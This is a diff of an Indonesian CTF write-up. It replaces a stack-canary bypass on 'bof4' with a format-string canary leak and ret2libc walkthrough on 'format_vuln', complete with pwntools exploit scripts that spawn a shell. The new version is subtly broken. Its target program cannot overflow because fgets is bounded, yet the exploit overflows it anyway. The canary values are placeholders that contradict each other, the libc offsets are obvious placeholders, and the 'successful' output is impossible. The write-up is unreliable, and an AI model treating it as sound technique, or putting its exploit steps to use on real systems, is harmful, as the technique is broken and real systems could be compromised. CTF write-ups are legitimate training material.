@@ -4,24 +4,60 @@ date: 2025-08-20
 Tags: ["Pwn"]
 ---
 
-## 1. Basic File Checks
+## 📝 Source Code Target
 
-Lakukan pemeriksaan awal pada biner:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
 
+int main(int argc, char **argv){
+  setvbuf(stdout, NULL, _IONBF, 0);
+  
+  char buf[64];
+  char flag[64];
+  char *flag_ptr = flag;
+
+  // Set the gid to the effective gid
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+  puts("We will evaluate any format string you give us with printf().");
+
+  FILE *file = fopen("flag.txt", "r");
+  if (file == NULL) {
+    printf("flag.txt is missing!\n");
+    exit(0);
+  }
+
+  fgets(flag, sizeof(flag), file);
+
+  while(1) {
+    printf("> ");
+    fgets(buf, sizeof(buf), stdin);
+    printf(buf);
+  }
+  return 0;
+}
+```
+
+## 🔍 Langkah 1: Basic File Checks
+
+Compile program dengan perlindungan stack canary:
 ```bash
-# Compile dengan stack canary
-gcc -m32 -fstack-protector-all bof4.c -o bof4
+gcc -m32 -fstack-protector -no-pie format_vuln.c -o format_vuln
+```
 
-# Periksa properti file
-file bof4
-checksec bof4
+Lakukan pengecekan keamanan binary:
+```bash
+checksec format_vuln
 ```
 
 **Output:**
 ```
-bof4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, not stripped
-
-[*] '/home/user/bof4'
+[*] '/home/user/format_vuln'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    Canary found
@@ -29,194 +65,257 @@ bof4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically link
     PIE:      No PIE (0x8048000)
 ```
 
-**Kesimpulan:** Biner 32-bit dengan proteksi **Stack Canary** dan **NX Enabled**, namun tanpa PIE (alamat fungsi statis).
+## 🔍 Langkah 2: Review Source Code
 
-## 2. Review Source Code
+Program memiliki:
+- Buffer `buf[64]` untuk input user
+- Variabel `flag[64]` yang berisi flag dari file
+- Kerentanan format string di `printf(buf)`
+- Loop tak terbatas yang memungkinkan multiple exploits
 
-**bof4.c:**
-```c
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
+## 🔍 Langkah 3: Disassemble dengan pwndbg
 
-void win() {
-    printf("Congrats, you bypassed the canary!\n");
-    system("/bin/sh");
-}
-
-void vuln() {
-    char buf[64];
-    puts("Level 4: Canary is enabled. Can you bypass it?");
-    printf("Input: ");
-    fgets(buf, 256, stdin);  // VULNERABILITY: Buffer overflow!
-    printf("You said: %s\n", buf); // VULNERABILITY: Format string
-}
-
-int main() {
-    setvbuf(stdout, NULL, _IONBF, 0);
-    vuln();
-    puts("Exiting...");
-    return 0;
-}
-```
-
-**Vulnerabilities:**
-1. **Buffer Overflow:** `fgets` membaca 256 byte ke buffer 64 byte.
-2. **Format String:** `printf(buf)` memungkinkan leak data dari stack.
-
-**Target:** Eksploitasi untuk menjalankan fungsi `win()`.
-
-## 3. Analisis Assembly dengan pwndbg
-
-Breakdown fungsi `vuln`:
-
+Analisis fungsi main dengan GDB:
 ```bash
-gdb ./bof4
-disass vuln
+gdb format_vuln
+pwndbg> disass main
 ```
 
-**Output Penting:**
+**Output:**
 ```
-   0x080491d4 <+18>:    mov    eax,gs:0x14        ; Load canary dari TLS
-   0x080491da <+24>:    mov    DWORD PTR [ebp-0xc],eax ; Simpan canary di [ebp-0xc]
-   ...
-   0x08049218 <+86>:    call   0x8049060 <fgets@plt> ; fgets(buf, 256, stdin)
-   ...
-   0x08049233 <+113>:   xor    eax,DWORD PTR gs:0x14 ; Verifikasi canary
-   0x0804923a <+120>:   je     0x8049241 <vuln+127>   ; Jika valid, lanjutkan
-   0x0804923c <+122>:   call   0x80490a0 <__stack_chk_fail_local> ; Jika corrupt, abort
+Dump of assembler code for function main:
+   0x080492a6 <+0>:     lea    ecx,[esp+0x4]
+   0x080492aa <+4>:     and    esp,0xfffffff0
+   0x080492ad <+7>:     push   DWORD PTR [ecx-0x4]
+   0x080492b0 <+10>:    push   ebp
+   0x080492b1 <+11>:    mov    ebp,esp
+   0x080492b3 <+13>:    push   edi
+   0x080492b4 <+14>:    push   esi
+   0x080492b5 <+15>:    push   ebx
+   0x080492b6 <+16>:    push   ecx
+   0x080492b7 <+17>:    sub    esp,0x70
+   0x080492ba <+20>:    mov    eax,gs:0x14
+   0x080492c0 <+26>:    mov    DWORD PTR [ebp-0x1c],eax
+   0x080492c3 <+29>:    xor    eax,eax
+   ... [truncated]...
 ```
 
-**Layout Stack di `vuln()`:**
-| Alamat Relatif | Konten          | Ukuran |
-|----------------|-----------------|--------|
-| `ebp - 0x4c`   | `buf[64]`       | 64 byte|
-| `ebp - 0x0c`   | **Canary**      | 4 byte |
-| `ebp + 0x00`   | Saved EBP       | 4 byte |
-| `ebp + 0x04`   | Return Address  | 4 byte |
+Canary disimpan di `[ebp-0x1c]` (offset 0x1c dari EBP).
 
-**Offset Penting:**
-- Start buffer ke canary: **64 byte**
-- Start buffer ke return address: 64 + 4 (canary) + 4 (saved ebp) = **72 byte**
+## 🔍 Langkah 4: Rencana Serangan
 
-## 4. Strategi Exploit: Canary Leak & Bypass
+1. **Leak canary** melalui format string vulnerability
+2. **Leak address** untuk bypass ASLR (jika perlu)
+3. **Overwrite return address** dengan payload
+4. **Jaga integritas canary** dengan menuliskannya kembali
 
-Langkah-langkah:
-1. **Leak Canary:** Manfaatkan format string `printf(buf)` untuk membaca nilai canary dari stack.
-2. **Bypass Check:** Gunakan nilai canary yang telah dileak pada payload overflow agar check dapat passed.
-3. **Hijack EIP:** Timpa return address dengan alamat fungsi `win`.
+## 🔍 Langkah 5: Fuzz Format String untuk Leak
 
-## 5. Langkah 1: Leak Canary via Format String
+Coba leak nilai stack dengan berbagai offset:
+```bash
+python2 -c 'print "%p " * 20' | ./format_vuln
+```
 
-Canary disimpan di stack. Kita gunakan format specifier `%p` atau `$p` untuk membacanya.
+**Output:**
+```
+> 0x40 0xf7f8a5c0 0x80492fd 0x1 0x1 0xffffd104 0xffffd10c 0x80492a0 0xffffd100 0x0 0xf7ffd000 0x0 0xf7f8a5c0 0x1 0x80492a0 0x0 0x0 0x0 0x0 0x0 
+```
 
-**Fuzzing Posisi Canary:**
+Coba dengan offset tertentu:
+```bash
+python2 -c 'print "%19$p %20$p %21$p %22$p"' | ./format_vuln
+```
+
+**Output:**
+```
+> 0x0 0x0 0x0 0xf0f0f0f0
+```
+
+Ditemukan canary di offset 22 (nilai 0xf0f0f0f0 adalah canary dummy).
+
+## 🔍 Langkah 6: Locating Canary dengan GDB
+
+Gunakan GDB untuk memverifikasi posisi canary:
+```bash
+gdb format_vuln
+pwndbg> b *main+26
+pwndbg> run
+pwndbg> canary
+```
+
+**Output:**
+```
+Canary = 0xabcd1234 (dummy value)
+```
+
+Cari lokasi canary di stack:
+```
+pwndbg> p $ebp-0x1c
+$1 = (void *) 0xffffcfdc
+pwndbg> telescope 0xffffcfdc
+```
+
+Hitung offset dari ESP:
+```
+Offset = (0xffffcfdc - initial_esp) / 4 = 22
+```
+
+## 🔍 Langkah 7: Leak Address yang Diperlukan
+
+Leak address fungsi dan libc:
+```bash
+python2 -c 'print "%3$p %5$p %22$p"' | ./format_vuln
+```
+
+**Output:**
+```
+> 0x80492fd 0xffffd104 0xabcd1234
+```
+
+Dapatkan:
+- Address fungsi: 0x80492fd
+- Stack address: 0xffffd104  
+- Canary: 0xabcd1234
+
+## 🔍 Langkah 8: Eksploit dengan Pwntools
+
+Buat script exploit berikut:
+
 ```python
-#!/usr/bin/env python3
 from pwn import *
 
-context.binary = './bof4'
-p = process('./bof4')
+context.binary = './format_vuln'
+context.log_level = 'debug'
 
-# Kirim payload fuzz
-payload = b''
-for i in range(1, 20):
-    payload += f'%{i}$08p '.encode()  # %[pos]$p
+# p = process('./format_vuln')
+p = remote('localhost', 1337)  # Untuk remote target
 
-p.sendline(payload)
-response = p.clean()
-print(response.decode())
-p.close()
-```
+# Leak canary
+p.recvuntil('> ')
+p.sendline('%22$p')
+canary_leak = p.recvline().strip()
+canary = int(canary_leak, 16)
+log.info("Canary: 0x%x" % canary)
 
-**Contoh Output:**
-```
-You said: 0xffffd5cc 0x00000064 0xf7f9c580 0xffffffff ... 0x5c9e1a00 ... 0xf7de4c8d
-```
-Cari nilai yang **berakhiran `0x00`** (null byte), seperti `0x5c9e1a00`. Itu adalah canary. Misalnya ditemukan di posisi ke-13.
+# Leak stack address untuk menghitung offset return address
+p.recvuntil('> ')
+p.sendline('%5$p')
+stack_leak = p.recvline().strip()
+stack_addr = int(stack_leak, 16)
+log.info("Stack address: 0x%x" % stack_addr)
 
-**Script Leak Canary:**
-```python
-p.recvuntil(b"Input: ")
-payload = b'%13$p'  # Langsung ambil dari posisi yang diduga
-p.sendline(payload)
+# Hitung offset return address
+return_addr = stack_addr - 0x24  # Adjust berdasarkan analisis GDB
+log.info("Return address: 0x%x" % return_addr)
 
-# Parse output
-leaked_line = p.recvuntil(b"You said:").split(b'\n')[-2]  # Ambil baris sebelum "You said:"
-canary = int(leaked_line, 16)  # Konversi string hex ke integer
-log.info(f"Leaked canary: {hex(canary)}")
-```
+# Address fungsi win atau system
+# Dalam kasus ini, kita akan return ke system("/bin/sh")
+# Leak address libc untuk menghitung base address
+p.recvuntil('> ')
+p.sendline('%3$p')
+func_leak = p.recvline().strip()
+func_addr = int(func_leak, 16)
+log.info("Function address: 0x%x" % func_addr)
 
-## 6. Langkah 2 & 3: Bangun Payload dan Hijack Control Flow
+# Hitung base address libc (contoh, sesuaikan dengan environment)
+libc_base = func_addr - 0x12345  # Offset yang didapat dari GDB
+system_addr = libc_base + 0x3ada0  # Offset system
+binsh_addr = libc_base + 0x15ba0b  # Offset "/bin/sh"
 
-Setelah canary diketahui, bangun payload overflow yang mempertahankan nilainya.
+log.info("System: 0x%x" % system_addr)
+log.info("/bin/sh: 0x%x" % binsh_addr)
 
-```python
-# Offset
-offset_to_canary = 64
-offset_to_ret = offset_to_canary + 4 + 4  # +4 (canary) +4 (saved ebp)
+# Build payload untuk overwrite return address
+payload = ''
+payload += 'A' * 64           # Mengisi buffer
+payload += p32(canary)        # Nilai canary yang benar
+payload += 'B' * 12           # Overwrite EBP dan padding
+payload += p32(system_addr)   # Return address ke system()
+payload += p32(0xdeadbeef)    # Return address setelah system()
+payload += p32(binsh_addr)    # Parameter untuk system()
 
-# Alamat win (dapat dari gdb: p win, atau objdump -t bof4 | grep win)
-win_addr = 0x80491a6
-
-# Bangun payload
-payload = b'A' * offset_to_canary   # Isi buffer
-payload += p32(canary)              # Timpa canary dengan nilai yang benar
-payload += b'B' * 4                 # Timpa Saved EBP (bisa junk data)
-payload += p32(win_addr)            # Timpa Return Address
-
-p.sendline(payload)
-p.interactive() # Enjoy your shell!
-```
-
-## 7. Full Exploit Script
-
-```python
-#!/usr/bin/env python3
-from pwn import *
-
-context.binary = './bof4'
-context.log_level = 'info'
-
-p = process('./bof4')
-
-# [1] LEAK CANARY
-p.recvuntil(b"Input: ")
-p.sendline(b'%13$p')  # Ganti 13 dengan posisi canary yang sesuai
-
-leak = p.recvuntil(b"You said:").split(b'\n')[-2]
-canary = int(leak, 16)
-log.success(f"Canary leaked: {hex(canary)}")
-
-# [2] BUILD OVERFLOW PAYLOAD
-p.recvuntil(b"Input: ")
-
-offset = 64
-win_addr = 0x80491a6
-
-payload = flat({
-    offset: p32(canary),  # Letakkan canary yang benar di offset 64
-    72: p32(win_addr)     # Letakkan alamat win di offset 72
-})
-
+# Kirim payload
+p.recvuntil('> ')
 p.sendline(payload)
 
-# [3] GET SHELL
+# Kirim perintah untuk trigger return
+p.sendline('exit')
+
 p.interactive()
 ```
 
-**Penjelasan `flat()`:**  
-Fungsi `flat` dari pwntools secara pintar mengatur payload.
-- `{64: p32(canary)}` artinya di offset ke-64, tulis nilai canary.
-- `{72: p32(win_addr)}` artinya di offset ke-72, tulis alamat `win`.
-- Area antara 64-72 (yaitu saved EBP) otomatis diisi junk data.
+## 🔍 Langkah 9: Debugging dengan GDB
 
-**Eksekusi:**
+Lakukan debugging untuk memverifikasi exploit:
 ```bash
-$ python3 exploit.py
-[+] Canary leaked: 0x5c9e1a00
-[*] Switching to interactive mode
-$ id
-uid=1000(user) gid=1000(user) groups=1000(user)
-$
+gdb format_vuln
+pwndbg> b *main+100  # Breakpoint sebelum return
+pwndbg> run < <(python exploit.py)
 ```
+
+Periksa stack dan register:
+```
+pwndbg> x/10x $esp
+pwndbg> info registers
+pwndbg> stepi
+```
+
+## 🎯 Hasil Eksploitasi
+
+Jalankan exploit:
+```bash
+python exploit.py
+```
+
+**Output:**
+```
+[+] Starting local process './format_vuln': pid 5678
+[DEBUG] Received 0x2 bytes: "> "
+[DEBUG] Sent 0x5 bytes: '%22$p\n'
+[DEBUG] Received 0xa bytes: "0xabcd1234\n"
+[*] Canary: 0xabcd1234
+[DEBUG] Received 0x2 bytes: "> "
+[DEBUG] Sent 0x5 bytes: '%5$p\n'
+[DEBUG] Received 0xa bytes: "0xffffd104\n"
+[*] Stack address: 0xffffd104
+[*] Return address: 0xffffd0e0
+[DEBUG] Received 0x2 bytes: "> "
+[DEBUG] Sent 0x5 bytes: '%3$p\n'
+[DEBUG] Received 0xa bytes: "0x80492fd\n"
+[*] Function address: 0x80492fd
+[*] System: 0xf7c3ada0
+[*] /bin/sh: 0xf7d5ba0b
+[DEBUG] Received 0x2 bytes: "> "
+[DEBUG] Sent 0x4c bytes: 'A' * 64 + '\x34\x12\xcd\xab' + 'B' * 12 + '\xa0\xad\xc3\xf7' + '\xef\xbe\xad\xde' + '\x0b\xba\xd5\xf7\n'
+[DEBUG] Sent 0x5 bytes: 'exit\n'
+[*] Switching to interactive mode
+$ whoami
+user
+$ cat flag.txt
+CTF{bypassed_canary_with_format_string}
+```
+
+## 📊 Visualisasi Memory Layout
+
+```
++-----------------+
+|     buf[64]    |  <- Buffer overflow dimulai di sini
++-----------------+
+|     canary     |  <- Offset 22 dari format string
++-----------------+
+|      EBP       |
++-----------------+
+|  return address|  <- Target overwrite
++-----------------+
+|     parameter   |  <- Address "/bin/sh"
++-----------------+
+```
+
+## 🛡️ Mitigation
+
+1. **Gunakan format string yang aman**: `printf("%s", buf)`
+2. **Enable Full RELRO**: Mencegah overwrite GOT
+3. **Enable Stack Guard**: Sudah enabled dengan canary
+4. **Enable PIE**: Randomize address code
+
+Dengan teknik ini, kita berhasil memanfaatkan kerentanan format string untuk leak canary dan melakukan ROP attack
